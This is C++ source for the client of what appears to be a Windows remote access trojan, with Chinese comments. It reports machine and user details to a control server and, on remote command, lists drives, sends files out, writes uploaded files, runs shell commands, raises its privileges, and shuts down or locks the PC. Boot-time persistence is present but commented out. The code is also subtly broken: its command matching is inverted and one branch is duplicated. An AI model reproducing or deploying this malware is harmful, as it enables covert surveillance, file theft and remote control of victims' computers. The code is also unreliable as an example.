#include "../tcpSocket/tcpSocke.h"

int GetPCMessage(SOCKET fd);//获取计算机基本信息

int FileBrowse(SOCKET fd);//文件浏览

int recvFile(SOCKET fd, char* buf);//文件下载

int sendFile(SOCKET fd, char* buf);//文件上传

int Shell(SOCKET fd, char* buf);//执行shell指令

bool UpPrivilegeValue();//提权操作

int main()
{
	//char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260

	//copySelf(pathName);//将文件复制到系统目录

	//ComputerStart(pathName);//设置程序开机自启

	init_Socket();//创建客户端socket

	SOCKET fd = CreatClientScoket("127.0.0.1");//连接

	char str[] = "connect success";//连接成功
	encode(str);
	send(fd, str, strlen(str), 0);
	Sleep(200);

	GetPCMessage(fd);//将PC信息发送给服务端

	HeartBeat(fd);//心跳功能

	char command[16] = {0};//存储接收的指令
	char recvbuf[BUFSIZ] = { 0 };//接收信息的缓冲区
	//创建对应的线程，需要使用时就加入
	while (true)
	{
		recv(fd, command, 16, 0);
		decode(command);
		if (strcmp(command, "filebrowse"))
		{
			thread th1 = thread(FileBrowse, fd);
			th1.join();
			continue;
		}
		else if (strcmp(command, "shell"))
		{
			thread th2 = thread(Shell, fd, recvbuf);
			th2.join();
			continue;
		}
		else if(strcmp(command, "download"))
		{
			thread th3 = thread(sendFile, fd, recvbuf);
			th3.join();
			continue;
		}
		else if (strcmp(command, "upload"))
		{
			thread th4 = thread(recvFile, fd, recvbuf);
			th4.join();
			continue;
		}
		else if(strcmp(command, "upright"))
		{
			thread th5 = thread(UpPrivilegeValue);
			th5.join();
			continue;
		}
		else if (strcmp(command, "kill"))
		{
			char text[] = "Client has exit!";
			encode(text);
			send(fd, text, strlen(text), 0);//关闭客户端
			exit(0);
			continue;
		}
		else if (strcmp(command, "kill"))
		{
			system("shutdown -s -t 1");//关机
			continue;
		}
		else if (strcmp(command, "reboot"))
		{
			system("shutdown -r -t 10"); //重启
			continue;
		}
		else if (strcmp(command, "cancel"))
		{
			system("shutdown -a");//取消关机
			continue;
		}
		else if (strcmp(command, "lock"))
		{
			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");//锁屏
			continue;
		}
		else
		{
			send(fd, "Error code", strlen("Error code"), 0);//发送指令错误
			continue;
		}
		ZeroMemory(recvbuf, sizeof(recvbuf));//初始化
		ZeroMemory(command, sizeof(command));//初始化
		Sleep(2000);
	}
	closesocket(fd);//关闭客户端socket

	close_Socket();//WSACleanup
}

int GetPCMessage(SOCKET fd)
{
	PC_Message msg;//定义msg结构体
	char UserName[BUFSIZ] = { 0 };//定义和初始化

	if (getmessage(&msg) == false)//获取目标计算机的IP，计算机名以及用户名
	{
		//err("getmessage");
	}

	TcharToChar(msg.UserName, UserName);//将TCHAR转换为char
	encode(msg.PCName);//加密
	//cout << msg.PCName << endl;
	encode(UserName);
	cout << strlen(msg.PCName) << endl;
	cout << UserName << endl;
	cout << strlen(UserName) << endl;
	encode(msg.IP);
	cout << strlen(msg.IP) << endl;
	//cout << msg.IP << endl;

	send(fd, msg.PCName, strlen(msg.PCName), 0);
	Sleep(200);
	
	send(fd, UserName, strlen(UserName), 0);
	Sleep(200);
	
	send(fd, msg.IP, strlen(msg.IP), 0);
	Sleep(200);
	
	return 0;
}

int FileBrowse(SOCKET fd)
{
	//获取C盘和D盘内的所有文件名
	char FileName[FileNameRow][FileNameCol];
	char Zero[FileNameCol] = { 0 };
	GetFileName(FileName);
	for (int i = 0; i < FileNameRow; i++)
	{
		if (strcmp(FileName[i], Zero))
		{
			//printf("%s\n", FileName[i]);
			send(fd, FileName[i], strlen(FileName[i]), 0);
		}
	}
	return 0;
}

int sendFile(SOCKET fd, char* buf)
{
	ZeroMemory(buf, sizeof(buf));
	recv(fd, buf, BUFSIZ, 0);//接收要下载的文件名（绝对路径）
	char sendbuf[BUFSIZ * 2];
	DWORD dwRead;
	BOOL bRet;
	Sleep(200);

	HANDLE hFile = CreateFile((LPCWSTR)buf, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE) 
	{
		return 1;
	}
	while (true) 
	{   //发送文件的buf
		bRet = ReadFile(hFile, sendbuf, 1024, &dwRead, NULL);
		if (bRet == FALSE)
		{
			break;
		}
		else if (dwRead == 0) 
		{
			Sleep(100);
			break;
		}
		else 
		{
			send(fd, sendbuf, dwRead, 0);
		}
	}
	char res[] = "success";
	encode(res);
	send(fd, res, strlen(res) + 1, 0);
	return 0;
}

int recvFile(SOCKET fd, char* buf)//文件下载
{
	ZeroMemory(buf, sizeof(buf));
	recv(fd, buf, BUFSIZ, 0);//接受要上传文件的绝对路径
	int len;
	char recvBuf[1024] = { 0 };   // 缓冲区
	HANDLE hFile;               // 文件句柄
	DWORD count;                // 写入的数据计数

	hFile = CreateFile((LPCWSTR)buf, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_ARCHIVE, NULL);
	if (hFile == INVALID_HANDLE_VALUE) 
	{
		return 1;
	}
	char begin[] = "BEGIN";
	encode(begin);
	send(fd, begin, strlen(begin), 0);
	while (true) 
	{
		// 从客户端读数据
		ZeroMemory(recvBuf, sizeof(recvBuf));
		len = recv(fd, recvBuf, 1024, 0);
		decode(recvBuf);
		if (strlen(recvBuf) < 5) 
		{
			if (strcmp(recvBuf, "EOF") == 0) {
				CloseHandle(hFile);
				break;
			}
		}
		WriteFile(hFile, recvBuf, len, &count, 0);
	}
	Sleep(500);
	char RECV[] = "RECV";
	encode(RECV);
	send(fd, RECV, strlen(RECV), 0);
	return 0;
}

int Shell(SOCKET fd, char* buf)
{
	char shell[40] = { 0 };
	char res[BUFSIZ * 2] = { 0 };
	ZeroMemory(buf, sizeof(buf));
	recv(fd, buf, strlen(buf), 0);	//接收发送来的shell指令
	decode(buf);
	for (int i = 1; buf[i] != '\0'; i++) 
	{
		shell[i - 1] = buf[i];
	}
	if (!cmd(shell, res)) 
	{
		send(fd, res, strlen(res) + 1, 0);
	}
	else
	{
		char text[] = "CMD Error!";
		encode(text);
		send(fd, text, strlen(text), 0);
	}
	return 0;
}

bool UpPrivilegeValue()
{
	//OpenProcessToken()函数用来打开与进程相关联的访问令牌
	HANDLE hToken = nullptr;
	if (FALSE == OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		return false;
	}
	//LookupPrivilegeValue()函数查看系统权限的特权值
	LUID luid;
	if (FALSE == LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
	{
		CloseHandle(hToken);
		return false;
	}
	//调整权限设置
	TOKEN_PRIVILEGES Tok;
	Tok.PrivilegeCount = 1;
	Tok.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	Tok.Privileges[0].Luid = luid;
	if (FALSE == AdjustTokenPrivileges(hToken, FALSE, &Tok, sizeof(Tok), nullptr, nullptr))
	{
		CloseHandle(hToken);
		return false;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		CloseHandle(hToken);
		return false;
	}

	CloseHandle(hToken);
	return true;
}
